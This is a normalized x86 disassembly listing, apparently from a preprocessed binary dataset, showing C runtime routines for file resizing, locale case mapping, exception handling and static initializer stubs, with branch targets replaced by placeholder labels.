jge r-xdata
mov ebx 0x1000
lea eax [ ebp - 0x1004 ]
push ebx
push esi
push eax
call sub_405360
push 0x8000
push [ ebp + 0x8 ]
call sub_40d624
add esp 0x14
mov [ ebp + 0xc ] eax
push 0x0
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_409194
add esp 0xc
mov eax esi
pop edi
jmp r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_409194
push [ ebp + 0x8 ]
call sub_40bd83
add esp 0x10
push eax
call [ SetEndOfFile@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
dec esi
cmp esi ebx
jne r-xdata
push eax
lea eax [ ebp - 0x1004 ]
push eax
push [ ebp + 0x8 ]
call sub_40779c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop esi
pop ebx
leave
retn
call sub_406dfe
mov [ eax ] 0xd
call [ GetLastError@IAT ]
mov edi eax
call sub_406e07
mov [ eax ] edi
call sub_406e07
cmp [ eax ] 0x5
jne r-xdata
sub edi eax
test edi edi
jle r-xdata
or esi 0xffffffff
call sub_406dfe
mov [ eax ] 0xd
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d624
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
cmp edi ebx
mov eax ebx
jge r-xdata
sub_40cf5f
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
dec eax
push ebx
push esi
dec eax
push edi
je r-xdata
mov ebx [ rw-data ]
mov edi rw-data
dec eax
dec eax
je r-xdata
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_408c93
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_40d0e1
mov edi eax
pop ecx
add edi 0x8
pop ecx
mov ebx [ edi ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x8
je r-xdata
cmp [ ebp - 0x4 ] ecx
je r-xdata
xor eax eax
push ebx
call sub_406d76
pop ecx
jmp r-xdata
cmp ebx 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov edx [ esi + 0x54 ]
cmp eax 0x8
mov [ ebp - 0x8 ] edx
mov [ esi + 0x54 ] ecx
jne r-xdata
cmp eax 0xb
je r-xdata
push 0x3
call sub_406e4e
push 0x1
call sub_406d76
pop ecx
sub eax 0x4
je r-xdata
mov [ edi ] ecx
mov edx [ esi + 0x58 ]
mov [ esi + 0x58 ] 0x8c
mov [ ebp - 0xc ] edx
cmp eax 0x4
jne r-xdata
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jne r-xdata
push 0x1
call sub_406d76
pop ecx
mov ecx [ rw-data ]
mov eax [ rw-data ]
add eax ecx
cmp ecx eax
jge r-xdata
cmp eax 0x8
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x1
call sub_406d15
mov esi [ ebp + 0x8 ]
pop ecx
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call ebx
cmp [ ebp + 0x8 ] 0xb
pop ecx
je r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x8
mov [ esi + 0x54 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x4
jne r-xdata
mov edx [ esi + 0x50 ]
add eax 0xc
and [ edx + eax - 0x4 ] 0x0
mov edx [ rw-data ]
mov edi [ rw-data ]
inc ecx
add edi edx
cmp ecx edi
jl r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
mov [ esi + 0x58 ] eax
sub_40d0e1
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx + 0x4 ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax + 0x4 ] esi
je r-xdata
cmp [ eax + 0x4 ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_40d11e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_40d342
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_40c960
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_40c960
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_40d342
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_40d36d
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
cmp [ rw-data ] ebx
mov edi [ InterlockedDecrement@IAT ]
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax 0x61
jl r-xdata
push [ esp + 0x10 ]
call sub_40d3dc
test ebx ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
push esi
call edi
push 0x13
call sub_406d15
pop ecx
push 0x1
pop ebx
pop ebx
retn
cmp eax 0x7a
jg r-xdata
push esi
call edi
push 0x13
call sub_406d76
pop ecx
jmp r-xdata
sub eax 0x20
pop ebx
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
sub_40d3dc
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x61
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
pop ebx
leave
retn
cmp eax 0x7a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
push 0x1
and [ ebp + 0xa ] 0x0
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
push 0x2
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x2
push 0x2
push ebx
call sub_40d4a8
pop ecx
pop ecx
jmp r-xdata
sub eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
pop eax
lea ecx [ ebp - 0x4 ]
push 0x1
push 0x0
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push [ rw-data ]
call sub_40d11e
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_40d4a8
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_40cb0e
add esp 0x1c
test eax eax
jne r-xdata
sub_40d51d
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_40d4a8
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_40d11e
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_40d5f0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40d624
mov eax [ esp + 0x4 ]
push esi
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov esi 0x8000
mov ecx [ ecx * 4 + rw-data ]
lea edx [ ecx + eax * 4 + 0x4 ]
mov cl [ ecx + eax * 4 + 0x4 ]
mov al cl
and eax 0x80
cmp [ esp + 0xc ] esi
jne r-xdata
cmp [ esp + 0xc ] 0x4000
jne r-xdata
and cl 0x7f
jmp r-xdata
call sub_406dfe
mov [ eax ] 0x16
or eax 0xffffffff
pop esi
retn
or cl 0x80
neg eax
sbb eax eax
mov [ edx ] cl
and ax 0xc000
add eax esi
pop esi
retn
sub_401000
call sub_40100a
jmp sub_401014
sub_40100a
mov ecx rw-data
jmp sub_40254e
sub_401014
push sub_401020
call sub_404ceb
pop ecx
retn
sub_401020
mov ecx rw-data
jmp sub_4026ce
sub_40102a
call sub_401034
jmp sub_40103e
sub_401034
mov ecx rw-data
jmp sub_4033d3
sub_40103e
push sub_40104a
call sub_404ceb
pop ecx
retn
sub_40104a
mov ecx rw-data
jmp sub_403554
sub_40154e
mov eax [ ebp - 0x38 ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax r-xdata
retn
cmp [ eax ] bl
je r-xdata
call [ GetLastError@IAT ]
sub_40167c
retn
sub_40167d
push [ esp + 0x4 ]
call sub_40167c
pop ecx
xor eax eax
retn 0x4
sub_4020a0
push 0x1
call sub_402176
retn
sub_402312
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
add eax 0x2
test eax eax
jge r-xdata
push eax
call sub_40527e
mov [ ebp + 0x8 ] eax
pop ecx
mov eax r-xdata
retn
xor eax eax
sub_4023c0
test [ rw-data ] 0x1
jne r-xdata
jmp sub_4023d5
or [ rw-data ] 0x1
sub_4023d5
push sub_4026cd
call sub_404ceb
pop ecx
retn
sub_4023e1
call sub_4023eb
jmp sub_4023f8
sub_4023eb
push 0x0
mov ecx rw-data
call sub_402adb
retn
sub_4023f8
push sub_402404
call sub_404ceb
pop ecx
retn
sub_402404
mov ecx rw-data
jmp sub_402ae6
sub_40240e
call sub_402418
jmp sub_402425
sub_402418
push 0x0
mov ecx rw-data
call sub_402adb
retn
sub_402425
push sub_402431
call sub_404ceb
pop ecx
retn
sub_402431
mov ecx rw-data
jmp sub_402ae6
sub_40243b
call sub_402445
jmp sub_402454
sub_402445
push 0x1
push 0x0
mov ecx rw-data
call sub_40284d
retn
sub_402454
push sub_402460
call sub_404ceb
pop ecx
retn
sub_402460
mov ecx rw-data
jmp sub_40246a
sub_40246a
mov eax [ ecx ]
add ecx 0x8
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] r--data
jmp sub_4027da
sub_40247f
call sub_402489
jmp sub_402498
sub_402489
push 0x1
push 0x0
mov ecx rw-data
call sub_40277b
retn
sub_402498
push sub_4024a4
call sub_404ceb
pop ecx
retn
sub_4024a4
mov ecx rw-data
jmp sub_4024ae
sub_4024ae
mov eax [ ecx ]
add ecx 0x4
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
jmp sub_4027da
sub_4024c3
call sub_4024cd
jmp sub_4024da
sub_4024cd
push 0x0
mov ecx rw-data
call sub_402adb
retn
sub_4024da
push sub_4024e6
call sub_404ceb
pop ecx
retn
sub_4024e6
mov ecx rw-data
jmp sub_402ae6
sub_4024f0
call sub_4024fa
jmp sub_402509
sub_4024fa
push 0x1
push 0x0
mov ecx rw-data
call sub_40277b
retn
sub_402509
push sub_402515
call sub_404ceb
pop ecx
retn
sub_402515
mov ecx rw-data
jmp sub_4024ae
sub_40251f
call sub_402529
jmp sub_402538
sub_402529
push 0x1
push 0x0
mov ecx rw-data
call sub_40277b
retn
sub_402538
push sub_402544
call sub_404ceb
pop ecx
retn
sub_402544
mov ecx rw-data
jmp sub_4024ae
sub_4026cd
retn
sub_4027da
mov [ ecx ] r--data
jmp sub_4046af
sub_4029b1
mov [ ecx ] r--data
add ecx 0x34
jmp sub_402960
sub_4029bf
or eax 0xffffffff
retn 0x4
sub_4029c5
xor eax eax
retn
sub_4029c8
or eax 0xffffffff
retn
sub_402ad3
mov eax ecx
retn 0x8
sub_402ad8
retn 0x4
sub_402adb
mov eax ecx
mov [ eax ] r--data
retn 0x4
sub_402f0a
mov eax [ ecx + 0x50 ]
test eax eax
je r-xdata
xor eax eax
retn
push eax
call sub_4065d2
test eax eax
pop ecx
jge r-xdata
or eax 0xffffffff
retn
sub_402f23
push esi
lea esi [ ecx - 0x4 ]
mov ecx esi
call sub_4024ae
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_402f42
push esi
mov esi ecx
call sub_4027da
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_402f5e
push esi
lea esi [ ecx - 0x8 ]
mov ecx esi
call sub_40246a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_402f7d
push esi
mov esi ecx
call sub_4029b1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_402f99
push esi
mov esi ecx
call sub_402ae6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_403088
mov eax [ ecx + 0x2c ]
inc [ eax ]
mov eax [ ecx + 0x1c ]
dec [ eax ]
mov eax [ ecx + 0x1c ]
mov eax [ eax ]
retn
sub_403098
mov eax [ ecx + 0x2c ]
dec [ eax ]
mov ecx [ ecx + 0x1c ]
mov eax [ ecx ]
lea edx [ eax + 0x1 ]
mov [ ecx ] edx
retn
sub_4030a8
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x1 ]
mov [ ecx ] edx
retn
sub_4031d0
test [ rw-data ] 0x1
jne r-xdata
call sub_4031fa
test [ rw-data ] 0x1
jne r-xdata
or [ rw-data ] 0x1
jmp sub_403206
or [ rw-data ] 0x1
sub_4031fa
push sub_4026cd
call sub_404ceb
pop ecx
retn
sub_403206
push sub_4026cd
call sub_404ceb
pop ecx
retn
sub_403212
call sub_40321c
jmp sub_403226
sub_40321c
mov ecx rw-data
jmp sub_40254e
sub_403226
push sub_403232
call sub_404ceb
pop ecx
retn
sub_403232
mov ecx rw-data
jmp sub_4026ce
sub_40323c
call sub_403246
jmp sub_403250
sub_403246
mov ecx rw-data
jmp sub_4033d3
sub_403250
push sub_40325c
call sub_404ceb
pop ecx
retn
sub_40325c
mov ecx rw-data
jmp sub_403554
sub_403266
call sub_403270
jmp sub_40327d
sub_403270
push 0x0
mov ecx rw-data
call sub_40396e
retn
sub_40327d
push sub_403289
call sub_404ceb
pop ecx
retn
sub_403289
mov ecx rw-data
jmp sub_403979
sub_403293
call sub_40329d
jmp sub_4032aa
sub_40329d
push 0x0
mov ecx rw-data
call sub_40396e
retn
sub_4032aa
push sub_4032b6
call sub_404ceb
pop ecx
retn
sub_4032b6
mov ecx rw-data
jmp sub_403979
sub_4032c0
call sub_4032ca
jmp sub_4032d7
sub_4032ca
push 0x0
mov ecx rw-data
call sub_40396e
retn
sub_4032d7
push sub_4032e3
call sub_404ceb
pop ecx
retn
sub_4032e3
mov ecx rw-data
jmp sub_403979
sub_4032ed
call sub_4032f7
jmp sub_403306
sub_4032f7
push 0x1
push 0x0
mov ecx rw-data
call sub_40371d
retn
sub_403306
push sub_403312
call sub_404ceb
pop ecx
retn
sub_403312
mov ecx rw-data
jmp sub_40331c
sub_40331c
mov eax [ ecx ]
add ecx 0x8
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] r--data
jmp sub_4036aa
sub_403331
call sub_40333b
jmp sub_40334a
sub_40333b
push 0x1
push 0x0
mov ecx rw-data
call sub_403601
retn
sub_40334a
push sub_403356
call sub_404ceb
pop ecx
retn
sub_403356
mov ecx rw-data
jmp sub_403360
sub_403360
mov eax [ ecx ]
add ecx 0x4
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
jmp sub_4036aa
sub_403375
call sub_40337f
jmp sub_40338e
sub_40337f
push 0x1
push 0x0
mov ecx rw-data
call sub_403601
retn
sub_40338e
push sub_40339a
call sub_404ceb
pop ecx
retn
sub_40339a
mov ecx rw-data
jmp sub_403360
sub_4033a4
call sub_4033ae
jmp sub_4033bd
sub_4033ae
push 0x1
push 0x0
mov ecx rw-data
call sub_403601
retn
sub_4033bd
push sub_4033c9
call sub_404ceb
pop ecx
retn
sub_4033c9
mov ecx rw-data
jmp sub_403360
sub_4036aa
mov [ ecx ] r--data
jmp sub_4046af
sub_4037dc
mov [ ecx ] r--data
add ecx 0x34
jmp sub_402960
sub_4037ea
or ax 0xffff
retn 0x4
sub_4037f1
or ax 0xffff
retn
sub_40396e
mov eax ecx
mov [ eax ] r--data
retn 0x4
sub_403e06
push esi
lea esi [ ecx - 0x4 ]
mov ecx esi
call sub_403360
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_403e25
push esi
mov esi ecx
call sub_4036aa
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_403e41
push esi
lea esi [ ecx - 0x8 ]
mov ecx esi
call sub_40331c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_403e60
push esi
mov esi ecx
call sub_4037dc
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_403e7c
push esi
mov esi ecx
call sub_403979
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_403ee2
mov eax [ ecx + 0x2c ]
mov edx [ esp + 0x4 ]
sub [ eax ] edx
mov eax [ ecx + 0x1c ]
lea ecx [ edx + edx ]
add [ eax ] ecx
retn 0x4
sub_403ef6
mov eax [ ecx + 0x2c ]
inc [ eax ]
mov eax [ ecx + 0x1c ]
add [ eax ] 0xfffffffe
mov eax [ ecx + 0x1c ]
mov eax [ eax ]
retn
sub_403f07
mov eax [ ecx + 0x2c ]
dec [ eax ]
mov ecx [ ecx + 0x1c ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
retn
sub_403f17
mov eax [ ecx + 0x30 ]
mov edx [ esp + 0x4 ]
sub [ eax ] edx
mov eax [ ecx + 0x20 ]
lea ecx [ edx + edx ]
add [ eax ] ecx
retn 0x4
sub_403f2b
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
retn
sub_403ffa
test [ rw-data ] 0x1
jne r-xdata
call sub_404024
test [ rw-data ] 0x1
jne r-xdata
or [ rw-data ] 0x1
jmp sub_404030
or [ rw-data ] 0x1
sub_404024
push sub_4026cd
call sub_404ceb
pop ecx
retn
sub_404030
push sub_4026cd
call sub_404ceb
pop ecx
retn
sub_404105
mov eax [ ecx + 0x10 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_40416c
push esi
mov esi ecx
call sub_40412f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_40425b
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_404188
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_404343
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_404188
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_40435b
test [ rw-data ] 0x1
jne r-xdata
call sub_404385
test [ rw-data ] 0x1
jne r-xdata
or [ rw-data ] 0x1
jmp sub_404391
or [ rw-data ] 0x1
sub_404385
push sub_4026cd
call sub_404ceb
pop ecx
retn
sub_404391
push sub_4026cd
call sub_404ceb
pop ecx
retn
sub_40441b
push 0x3
push rw-data
call [ InterlockedExchange@IAT ]
cmp eax 0x2
jne r-xdata
retn
push rw-data
call [ DeleteCriticalSection@IAT ]
sub_404439
cmp [ rw-data ] 0x2
jne r-xdata
retn
push rw-data
call [ LeaveCriticalSection@IAT ]
sub_4045a8
push esi
mov esi ecx
call sub_40456b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_404697
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_4045c4
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_4046ff
push esi
mov esi ecx
call sub_4046af
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_404805
call sub_40480f
jmp sub_404810
sub_40480f
retn
sub_404810
push sub_40481c
call sub_404ceb
pop ecx
retn
sub_40481c
mov ecx rw-data
jmp sub_402960
sub_4049ac
mov [ ecx ] r--data
retn
sub_4049b3
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_4049d0
push esi
mov esi ecx
call sub_4049ec
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_404a74
test [ rw-data ] 0x1
jne r-xdata
call sub_404a9e
test [ rw-data ] 0x1
jne r-xdata
or [ rw-data ] 0x1
jmp sub_404aaa
or [ rw-data ] 0x1
sub_404a9e
push sub_4026cd
call sub_404ceb
pop ecx
retn
sub_404aaa
push sub_4026cd
call sub_404ceb
pop ecx
retn
sub_404ceb
push [ esp + 0x4 ]
call sub_404c6d
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_404d55
push esi
mov esi ecx
call sub_404d2c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_40502e
push 0x40
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_404ffd
add esp 0xc
retn
sub_40527e
push 0x1
push [ esp + 0x8 ]
call sub_40735f
pop ecx
pop ecx
retn
sub_4054e4
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_4054eb
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_405713
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4057b8
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_405842
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_4057b8
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_40586e
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_405888
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_406262
cmp [ rw-data ] 0x1
jne r-xdata
push [ esp + 0x4 ]
call sub_409e19
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_409de0
sub_40650b
mov eax [ esp + 0x8 ]
push 0x0
push [ eax + 0x4 ]
push [ eax ]
push [ esp + 0x10 ]
call sub_40a326
add esp 0x10
retn
sub_40668b
